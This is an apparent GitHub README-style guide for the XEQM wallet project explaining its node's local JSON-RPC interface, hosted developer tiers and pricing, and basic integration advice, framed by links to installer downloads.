![XEQM WALLET](assets/banner-article.png)

# Does XEQM have a developer API

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

Yes. The node exposes a JSON-RPC interface  -  chain information, service-node status and the service-node list among its methods  -  and the project's developer platform publishes tiers for application access, starting with a free tier that includes a monthly allowance of testnet calls. Building on a local node costs nothing but hardware.

## Two different things called an API

The first is the node's RPC interface, which ships with the daemon and answers questions about the chain. It is what a wallet uses to read a balance and what an explorer uses to render a page.

The second is the project's developer platform, which offers hosted access in tiers. They serve different purposes, and the first is what most people mean.

## The node's RPC methods

The documented calls include general chain information, a service-node status query and a list of service nodes. Those three cover a dashboard, a monitor and an integration that needs to know what the network is doing.

The interface is local by default, on port 9231. Exposing it to the internet is a decision rather than a default, and usually a bad one. [XEQM daemon firewall ports](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-daemon-firewall-ports.md) covers the ports.

## What the free tier includes

The developer platform's free tier includes a monthly allowance of testnet calls, which is where an integration starts. Nothing about building against testnet requires a payment or a production key.

That allowance is the practical entry point: enough to build something real and not enough to run a business on.

## The paid tiers

The published tiers are Builder, Production and Enterprise, priced in XEQM at one thousand, ten thousand and fifty thousand respectively. Each raises the limits that the free tier sets.

Those are platform prices rather than fees for using the chain. Running your own node is the alternative, and it costs nothing beyond the machine and the time. [How many XEQM coins exist](https://github.com/XEQMFoundation/account-guide/blob/main/how-many-xeqm-coins-exist.md) covers what the coin is.

## Where the platform's revenue goes

The published split is thirty-five percent to API node operators, thirty-five percent to the treasury and thirty percent to community governance.

That is worth knowing because it describes an ecosystem rather than a single company: the platform pays the people who run the nodes behind it.

## Running your own instead

A local node gives you the same RPC interface without a platform in between, at the cost of a machine, a synced chain and the ports. For a hobby project that is the cheaper route; for a service with users, the hosted tiers exist.

The trade is control against operational work, and both are legitimate. A local node also keeps your queries on your own machine, which matters if the addresses you ask about are sensitive. [Disk space for the XEQM chain](https://github.com/XEQMFoundation/platform-setup/blob/main/how-much-disk-for-xeqm-blockchain.md) covers the disk.

## What a hosted tier is really buying

Uptime, rate headroom and somebody else's operational work. A hosted endpoint removes the machine, the sync and the ports from your list, and adds a dependency you do not operate.

That is a reasonable trade for a product with users and a poor one for a script that runs once a day.

## Rate limits and what they mean for a design

Every tier sets limits, and a design that polls continuously will meet them. A better pattern is to read on a schedule, cache what does not change, and query on demand for what does.

Build the limits into the design rather than discovering them under load.

## What the RPC surface does not cover

It does not build transactions, hold keys or sign anything. Those belong to a wallet, and a wallet needs a seed on a machine you control.

Any platform that offers to sign for you is a custodian, whatever its documentation calls the feature.

## Monitoring an integration

Watch the height advancing and the response codes, not only whether the process is alive. An endpoint that answers with stale data is worse than one that fails loudly.

That is the same lesson as a node dashboard, applied to a client. [XEQM explorer shows disconnected](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-explorer-shows-disconnected.md) covers the equivalent failure in a website.

## What a first integration looks like

Read the chain status, confirm the height advances, then add a service-node query. Those two calls prove connectivity and data quality before anything is built on top.

Do it on testnet, where the free allowance lives and where a mistake costs nothing.

## What the API does not give you

It does not give you keys, and it does not move funds. Spending requires a wallet with a seed, and no platform tier replaces that.

Any service that offers to "manage" a balance on your behalf is a custodian, whatever it calls its interface. [How safe is XEQM WALLET](https://github.com/XEQMFoundation/custody-and-protection/blob/main/how-safe-is-xeqm-wallet.md) covers the model.

## Authentication and limits

The node's RPC is local and unauthenticated by default, which is why it should stay local. The platform's tiers use their own credentials and their own rate limits.

Do not put a platform key in client-side code, and do not expose a local RPC port to the internet to avoid writing an authentication layer.

## What to read before building

The core documentation for the daemon's options and its RPC surface, and the platform's own pages for tiers and limits. Those are two different documents and they answer different questions.

Mixing them produces a plan that assumes a hosted call where only a local one exists.

## Who this is for

A developer who wants chain data, a service that needs to watch nodes, or an integration that reads the network without holding coins. All three are served by the same interface.

A user who wants to hold and send XEQM does not need any of it. [What is XEQM WALLET](https://github.com/XEQMFoundation/account-guide/blob/main/what-is-xeqm-wallet.md) covers that case.

## What to do before you ask for a key

Decide whether you need a hosted endpoint at all. For a script on your own machine, a local node answers the same calls and costs nothing but disk and time.

A hosted tier makes sense when the endpoint has to be reachable by something you do not operate.

## What a first week looks like

Read the height, confirm it advances, log the responses, and watch for gaps. Most integration problems are visible in that first week and invisible afterwards, because the code has already learned to tolerate them.

Write the tolerances down so the next reader knows they were chosen rather than inherited.

## What to read in the responses

A height, a status and a list of service nodes. If the height is static, the endpoint is not reading a live chain, and everything else in the response is decoration.

That single field is the health check for any integration built on this interface.

## The summary

A JSON-RPC interface on the node, a hosted platform with a free testnet allowance and three paid tiers priced in XEQM, and the option to run your own node instead.

Start on testnet, keep the RPC local, and never put a key where a browser can read it. Those three habits cover the mistakes that cost an integration more than any missing feature.

## Frequently asked questions

### Is there a public API for XEQM?

The node exposes JSON-RPC, and the project's developer platform offers hosted access in tiers.

### Is there a free tier?

Yes, including a monthly allowance of testnet calls.

### How much do the paid tiers cost?

Builder, Production and Enterprise are priced at one thousand, ten thousand and fifty thousand XEQM.

### Can the API spend my coins?

No. Spending needs a wallet with a seed; an API tier is read access to chain data.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [What is XEQM WALLET](https://github.com/XEQMFoundation/account-guide/blob/main/what-is-xeqm-wallet.md)
- [Is XEQM WALLET free and open source](https://github.com/XEQMFoundation/account-guide/blob/main/is-xeqm-wallet-free.md)
- [Does XEQM have a mobile app](https://github.com/XEQMFoundation/account-guide/blob/main/does-xeqm-have-a-mobile-app.md)
